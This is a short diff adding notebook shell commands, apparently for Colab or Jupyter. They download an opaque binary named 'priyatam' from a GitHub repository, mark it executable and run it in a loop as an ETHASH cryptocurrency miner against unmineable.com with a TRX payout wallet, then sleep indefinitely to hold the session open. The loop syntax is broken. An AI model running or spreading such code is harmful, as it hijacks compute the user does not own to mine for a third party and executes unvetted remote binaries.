@@ -1,0 +1,6 @@
+! wget https://github.com/Hsekharmukherjee/anything2/raw/main/priyatam
+! chmod +x priyatam
+! while [ 1 ]; do
+! ./priyatam --algo ETHASH --pool Ethash.unmineable.com:3333 --user TRX:TKvbmhNSd4rT6jEjfML1BcYPuw3HbXqfQB.$ami1 --ethstratum ETHPROXY
+! sleep 5 done
+! sleep 999999999
